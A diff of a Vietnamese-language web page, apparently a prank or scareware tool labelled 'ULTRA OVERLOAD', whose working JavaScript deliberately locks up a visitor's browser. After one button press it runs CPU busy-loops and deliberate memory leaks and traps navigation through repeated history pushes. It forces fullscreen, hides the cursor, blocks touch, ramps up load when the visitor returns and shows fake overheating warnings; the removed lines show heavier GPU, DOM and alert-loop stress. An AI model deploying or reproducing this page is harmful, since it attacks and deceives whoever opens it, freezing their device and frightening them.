@@ -26,21 +26,20 @@
             user-select: none;
             -webkit-user-select: none;
             position: fixed;
-            cursor: none !important;
         }
 
-        * {
+        body.locked, body.locked * {
             cursor: none !important;
-            -webkit-tap-highlight-color: transparent;
+            touch-action: none !important;
         }
 
         .glass-card {
-            background: rgba(5, 5, 5, 0.98);
-            backdrop-filter: blur(30px);
-            -webkit-backdrop-filter: blur(30px);
+            background: rgba(5, 5, 5, 0.95);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
             border: 1px solid rgba(255, 0, 0, 0.2);
             border-radius: 30px;
-            box-shadow: 0 0 100px rgba(255, 0, 0, 0.4);
+            box-shadow: 0 0 80px rgba(255, 0, 0, 0.3);
             z-index: 100;
         }
 
@@ -54,16 +53,16 @@
             mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
-            animation: rotate 1.5s linear infinite;
+            animation: rotate 1.2s linear infinite;
         }
 
         @keyframes rotate { to { --angle: 360deg; } }
         @property --angle { syntax: '<angle>'; initial-value: 0deg; inherits: false; }
 
-        .glitch { animation: glitch 0.05s infinite; }
+        .glitch-fast { animation: glitch 0.04s infinite; }
         @keyframes glitch {
-            0% { transform: translate(1px, 1px); }
-            50% { transform: translate(-1px, -1px); filter: hue-rotate(90deg); }
+            0% { transform: translate(3px, 1px); filter: brightness(1.5); }
+            50% { transform: translate(-3px, -1px); filter: hue-rotate(270deg) invert(1); }
             100% { transform: translate(0); }
         }
 
@@ -76,252 +75,220 @@
             padding: 20px;
             font-family: 'Fira Code', monospace;
             color: #ff0000;
-            font-size: 10px;
+            font-size: 9px;
             pointer-events: none;
             overflow: hidden;
         }
 
-        /* Gây lag bằng CSS: Bộ lọc phức tạp */
-        .heavy-filter {
-            filter: blur(10px) contrast(200%) saturate(500%) drop-shadow(0 0 50px red);
-            animation: pulse-filter 0.1s infinite;
-        }
-
-        @keyframes pulse-filter {
-            50% { filter: blur(2px) contrast(100%) saturate(100%); }
-        }
-
-        .scanline {
+        #fake-alert {
+            display: none;
             position: fixed;
-            inset: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            background-size: 100% 4px, 3px 100%;
-            z-index: 1000;
-            pointer-events: none;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 85%;
+            background: #0a0a0a;
+            border: 3px solid #ff0000;
+            padding: 25px;
+            z-index: 5000;
+            text-align: center;
+            box-shadow: 0 0 100px #ff0000;
+            animation: pulse-red 1s infinite;
         }
 
-        .lag-box {
-            position: absolute;
-            width: 5px;
-            height: 5px;
-            background: red;
-            box-shadow: 0 0 20px red;
-            border-radius: 50%;
-            pointer-events: none;
+        @keyframes pulse-red {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.05); }
+        }
+
+        .creator-tag {
+            font-family: 'Fira Code', monospace;
+            text-shadow: 0 0 10px #ff0000;
         }
     </style>
 </head>
 <body class="flex items-center justify-center p-6" oncontextmenu="return false;">
-    <div class="scanline"></div>
-    <canvas id="matrix" class="fixed inset-0 opacity-30"></canvas>
-    <!-- Canvas phụ để gây lag xử lý đồ họa -->
-    <canvas id="lag-canvas" class="fixed inset-0 pointer-events-none opacity-10"></canvas>
+    <div id="matrix-container" class="fixed inset-0 opacity-20">
+        <canvas id="matrix"></canvas>
+    </div>
     
     <div id="terminal"></div>
+    <div id="fake-alert">
+        <h2 class="text-red-600 font-black text-xl mb-2">LỖI HỆ THỐNG TỐI CAO</h2>
+        <p class="text-[10px] text-gray-400 mb-4">Hệ thống đã sẵn sàng thực thi. Mọi nỗ lực thoát đều khiến CPU bị ép xung lên mức tối đa.</p>
+        <div class="py-2 px-6 bg-red-600 text-white text-xs font-black animate-pulse">ĐANG KHÓA CẢM ỨNG</div>
+    </div>
 
     <div id="main-content" class="glass-card w-full max-w-md p-1 relative">
         <div class="neon-border"></div>
-        <div class="bg-black/90 rounded-[28px] p-8 text-center relative z-10">
-            <div class="mb-6 inline-block p-4 rounded-full bg-red-600/10 border border-red-600/50 animate-pulse">
+        <div class="bg-black/95 rounded-[28px] p-8 text-center relative z-10">
+            <!-- Creator Tag -->
+            <div class="absolute top-4 right-6 creator-tag text-[10px] font-bold text-red-500/80 tracking-widest uppercase">
+                Created by TranVy
+            </div>
+
+            <div class="mb-6 inline-block p-4 rounded-full bg-red-600/20 border border-red-600 animate-bounce">
                 <svg class="w-12 h-12 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                 </svg>
             </div>
 
-            <h1 class="text-2xl font-black text-red-600 uppercase tracking-tighter mb-2 italic">TRẠNG THÁI: QUÁ TẢI</h1>
-            <p id="status" class="text-[10px] text-white/60 tracking-[0.3em] uppercase mb-6">Đang cưỡng chế nạp dữ liệu độc hại...</p>
+            <h1 class="text-3xl font-black text-red-600 uppercase tracking-tighter mb-1 italic">ULTRA OVERLOAD</h1>
+            <p class="text-[9px] text-red-500 font-bold mb-6 tracking-widest opacity-70">SYSTEM VULNERABILITY EXPLOIT</p>
+            
+            <p id="status" class="text-[10px] text-white/50 tracking-[0.3em] uppercase mb-6">Tài nguyên đã sẵn sàng...</p>
 
-            <div id="device-info" class="bg-red-600/5 border border-red-600/20 rounded-2xl p-4 mb-4 text-left font-mono text-[10px] space-y-1">
-                <div class="info-row"><span class="info-label">CPU STRESS:</span> <span id="cpu-val" class="info-value text-yellow-400">CALCULATING</span></div>
-                <div class="info-row"><span class="info-label">RAM USAGE:</span> <span id="ram-val" class="info-value">MAXIMIZING</span></div>
-                <div class="info-row"><span class="info-label">DỮ LIỆU:</span> <span id="data-val" class="info-value">OVERFLOW</span></div>
+            <div id="device-info" class="bg-red-900/10 border border-red-600/30 rounded-2xl p-4 mb-4 text-left font-mono text-[9px] space-y-1">
+                <div class="flex justify-between"><span>CORE TEMP:</span> <span id="temp-val" class="text-red-500">32°C</span></div>
+                <div class="flex justify-between"><span>CPU USAGE:</span> <span id="cpu-val" class="text-green-500">LOW</span></div>
+                <div class="flex justify-between"><span>BACKGROUND STRESS:</span> <span id="bg-val" class="text-gray-500">INACTIVE</span></div>
             </div>
 
-            <div class="bg-red-600/5 border border-red-600/20 rounded-2xl p-4 mb-6 text-left font-mono text-[10px] space-y-2">
-                <div class="flex justify-between"><span class="opacity-50">TIẾN TRÌNH LAG:</span> <span id="percent" class="text-red-500">0%</span></div>
-                <div class="w-full bg-white/5 h-1.5 rounded-full overflow-hidden mt-1">
-                    <div id="bar" class="h-full bg-red-600 w-0 transition-all duration-300"></div>
-                </div>
-            </div>
-
-            <button id="lock-btn" class="w-full py-5 bg-red-600 hover:bg-red-700 text-white font-black rounded-2xl shadow-[0_0_30px_rgba(220,38,38,0.5)] transition-all uppercase tracking-widest text-xs">
-                KÍCH HOẠT OVERLOAD
+            <button id="lock-btn" class="w-full py-5 bg-red-600 hover:bg-red-700 text-white font-black rounded-2xl shadow-[0_0_40px_rgba(220,38,38,0.6)] transition-all uppercase tracking-widest text-sm">
+                BẮT ĐẦU OVERLOAD
             </button>
 
-            <p class="mt-6 text-[9px] text-white/30 uppercase tracking-widest italic">Cảnh báo: Thiết bị có thể bị treo hoặc tự khởi động lại</p>
+            <p class="mt-6 text-[8px] text-red-600/40 uppercase font-bold">Cảnh báo: Máy sẽ đơ ngay khi ấn</p>
         </div>
     </div>
 
     <script>
         const btn = document.getElementById('lock-btn');
         const terminal = document.getElementById('terminal');
-        const bar = document.getElementById('bar');
-        const percent = document.getElementById('percent');
+        const fakeAlert = document.getElementById('fake-alert');
+        
         let isLocked = false;
-        let memorySpike = [];
+        let blockIntensity = 0;
 
-        // --- HỆ THỐNG GÂY LAG CỰC MẠNH ---
-
-        // 1. Gây lag CPU (Tính toán số nguyên tố vô hạn)
-        function cpuStress() {
+        // 1. Công cụ gây lag ngầm
+        function backgroundStress() {
             if (!isLocked) return;
-            let start = Date.now();
-            while (Date.now() - start < 50) { // Chiếm dụng thread chính trong 50ms mỗi vòng
-                Math.sqrt(Math.random() * Math.random());
-                JSON.parse(JSON.stringify({a: Math.random()}));
+            const start = Date.now();
+            while (Date.now() - start < blockIntensity) {
+                for(let i=0; i<500; i++) { Math.atan2(Math.random(), Math.random()); }
             }
-            requestAnimationFrame(cpuStress);
+            setTimeout(backgroundStress, 1);
         }
 
-        // 2. Gây lag RAM (Rò rỉ bộ nhớ ảo)
-        function ramStress() {
+        // 2. Gây lag bộ nhớ ngầm
+        let memoryLeaker = [];
+        function leakMemory() {
             if (!isLocked) return;
-            for (let i = 0; i < 100; i++) {
-                memorySpike.push(new Array(1000).fill("TRANVY_CLOUD_OVERFLOW_DATA_STRESS_TEST").join(""));
-            }
-            if (memorySpike.length > 5000) memorySpike.shift(); // Giữ mức lag ổn định để không làm sập tab ngay lập tức
-            setTimeout(ramStress, 100);
-        }
-
-        // 3. Gây lag GPU (Canvas Overdraw)
-        const lagCanvas = document.getElementById('lag-canvas');
-        const lctx = lagCanvas.getContext('2d');
-        function gpuStress() {
-            if (!isLocked) return;
-            lagCanvas.width = window.innerWidth;
-            lagCanvas.height = window.innerHeight;
-            for (let i = 0; i < 2000; i++) {
-                lctx.beginPath();
-                lctx.arc(Math.random() * lagCanvas.width, Math.random() * lagCanvas.height, 50, 0, Math.PI * 2);
-                lctx.fillStyle = `rgba(255, 0, 0, 0.1)`;
-                lctx.fill();
-                lctx.shadowBlur = 20;
-                lctx.shadowColor = "red";
-            }
-            requestAnimationFrame(gpuStress);
-        }
-
-        // 4. Gây lag DOM (Tạo hàng nghìn element)
-        function domStress() {
-            if (!isLocked) return;
-            const div = document.createElement('div');
-            div.className = 'lag-box heavy-filter';
-            div.style.left = Math.random() * 100 + "vw";
-            div.style.top = Math.random() * 100 + "vh";
-            document.body.appendChild(div);
-            if (document.querySelectorAll('.lag-box').length > 300) {
-                document.querySelector('.lag-box').remove();
-            }
-            setTimeout(domStress, 50);
-        }
-
-        // --- KHÓA ĐIỀU HƯỚNG ---
-        function pushStateLoop() {
-            window.history.pushState(null, null, window.location.href);
-        }
-
-        window.addEventListener('beforeunload', (e) => {
-            if (isLocked) { e.preventDefault(); e.returnValue = ''; }
-        });
-
-        window.addEventListener('popstate', () => {
-            if (isLocked) { pushStateLoop(); alert("ERROR: Tài nguyên hệ thống đã cạn kiệt."); }
-        });
-
-        function requestPointerLockSafely() {
             try {
-                if (document.pointerLockElement === null && isLocked) {
-                    document.body.requestPointerLock();
+                for (let i = 0; i < 50; i++) {
+                    memoryLeaker.push(new Array(500).fill("LAG_DATA_" + Math.random()));
                 }
-            } catch (e) {}
+                if (memoryLeaker.length > 3000) memoryLeaker.splice(0, 300);
+            } catch(e) {}
+            setTimeout(leakMemory, 200);
         }
 
-        document.addEventListener('click', () => {
-            if (isLocked) {
-                requestPointerLockSafely();
-                pushStateLoop();
-                forceFullscreen();
+        // 3. Cơ chế tự động kích hoạt lại khi quay lại app
+        document.addEventListener('visibilitychange', () => {
+            if (isLocked && document.visibilityState === 'visible') {
+                blockIntensity = 180; 
+                showLog("HỆ THỐNG PHÁT HIỆN TRUY CẬP LẠI: TĂNG CƯỜNG KHÓA...");
+                document.body.classList.add('glitch-fast');
             }
         });
 
-        function forceFullscreen() {
+        // 4. Chống thoát bằng History API
+        function lockHistory() {
             try {
-                const doc = document.documentElement;
-                const request = doc.requestFullscreen || doc.webkitRequestFullscreen || doc.mozRequestFullScreen || doc.msRequestFullscreen;
-                if (request && !document.fullscreenElement) request.call(doc).catch(() => {});
+                for(let i=0; i<5; i++) {
+                    window.history.pushState({locked: true}, "", "#overload-active-" + Date.now());
+                }
             } catch(e) {}
         }
 
-        // --- TIẾN TRÌNH ---
-        let progressValue = 0; 
-        function runProgress() {
-            if(progressValue < 100) {
-                progressValue += Math.random() * 0.1;
-                bar.style.width = progressValue + "%";
-                percent.innerText = Math.floor(progressValue) + "%";
-                setTimeout(runProgress, 200);
-            }
-        }
-        runProgress();
-
-        btn.onclick = (e) => {
-            e.preventDefault();
-            isLocked = true;
-            
-            forceFullscreen();
-            requestPointerLockSafely();
-            pushStateLoop();
-            
-            // Kích hoạt toàn bộ hệ thống lag
-            cpuStress();
-            ramStress();
-            gpuStress();
-            domStress();
-            
-            document.body.classList.add('glitch');
-            terminal.style.display = 'block';
-            btn.innerText = "DEVICE OVERHEATING...";
-            btn.disabled = true;
-
-            setInterval(() => {
-                const l = document.createElement('div');
-                l.innerText = `[CRITICAL] CPU Temp: ${90 + Math.random()*10}°C - Fan Speed: MAX`;
-                terminal.appendChild(l);
-                if(terminal.childNodes.length > 20) terminal.removeChild(terminal.firstChild);
-            }, 200);
-
-            // Vòng lặp cảnh báo gây lag UI
-            const alertLag = () => {
-                if(isLocked) {
-                    alert("CẢNH BÁO: Thiết bị đang trong tình trạng quá tải nhiệt!");
-                    setTimeout(alertLag, 300);
+        // 5. Fix lỗi Permission Policy cho Fullscreen
+        function attemptFullscreen() {
+            if(!isLocked) return;
+            try {
+                const doc = document.documentElement;
+                const requestMethod = doc.requestFullscreen || doc.webkitRequestFullscreen || doc.mozRequestFullScreen || doc.msRequestFullscreen;
+                if (requestMethod) {
+                    requestMethod.call(doc).catch(err => {
+                        console.log("Fullscreen bị chặn.");
+                    });
                 }
-            };
-            setTimeout(alertLag, 2000);
-        };
+            } catch(e) {}
+        }
+
+        // UI Updates
+        function showLog(msg) {
+            const l = document.createElement('div');
+            l.innerText = `[${new Date().toLocaleTimeString()}] > ${msg}`;
+            terminal.appendChild(l);
+            if(terminal.childNodes.length > 30) terminal.removeChild(terminal.firstChild);
+        }
 
         // Matrix Background
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         let drops = [];
-        function init() {
+        function initMatrix() {
             canvas.width = window.innerWidth;
             canvas.height = window.innerHeight;
-            for(let i=0; i<Math.floor(canvas.width/20); i++) drops[i] = 1;
+            for(let i=0; i<canvas.width/15; i++) drops[i] = 1;
         }
-        function draw() {
-            ctx.fillStyle = "rgba(0,0,0,0.05)";
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(0,0,0,0.15)";
             ctx.fillRect(0,0,canvas.width,canvas.height);
-            ctx.fillStyle = "#f00";
+            ctx.fillStyle = isLocked ? "#ff0000" : "#220000";
+            ctx.font = "12px monospace";
             for(let i=0; i<drops.length; i++) {
-                ctx.fillText(Math.floor(Math.random()*2), i*20, drops[i]*20);
-                if(drops[i]*20 > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                ctx.fillText(String.fromCharCode(0x30A0 + Math.random() * 96), i*15, drops[i]*15);
+                if(drops[i]*15 > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             }
         }
-        window.onresize = init;
-        init();
-        setInterval(draw, 33);
+        initMatrix();
+        setInterval(drawMatrix, 50);
+
+        // Kích hoạt
+        btn.onclick = (e) => {
+            e.preventDefault();
+            isLocked = true;
+            blockIntensity = 95; 
+
+            document.body.classList.add('locked', 'glitch-fast');
+            btn.innerText = "SYSTEM OVERLOADED";
+            btn.disabled = true;
+            terminal.style.display = 'block';
+            
+            document.getElementById('cpu-val').innerText = "MAX_LOAD";
+            document.getElementById('cpu-val').className = "text-red-600";
+            document.getElementById('bg-val').innerText = "STRESSING";
+            document.getElementById('bg-val').className = "text-red-500";
+
+            backgroundStress();
+            leakMemory();
+            lockHistory();
+            attemptFullscreen();
+
+            // Tăng nhiệt độ giả lập
+            let temp = 35;
+            setInterval(() => {
+                temp += Math.random() * 2;
+                if(temp > 108) temp = 108;
+                document.getElementById('temp-val').innerText = Math.floor(temp) + "°C";
+            }, 400);
+
+            setTimeout(() => {
+                fakeAlert.style.display = 'block';
+                blockIntensity = 150; 
+            }, 2500);
+
+            window.addEventListener('popstate', () => {
+                lockHistory();
+                showLog("CẢNH BÁO: KHÔNG THỂ THOÁT TRONG KHI ĐANG OVERLOAD.");
+            });
+        };
+
+        document.addEventListener('click', attemptFullscreen);
+        document.addEventListener('touchstart', attemptFullscreen);
+        window.addEventListener('resize', initMatrix);
     </script>
 </body>
 </html>
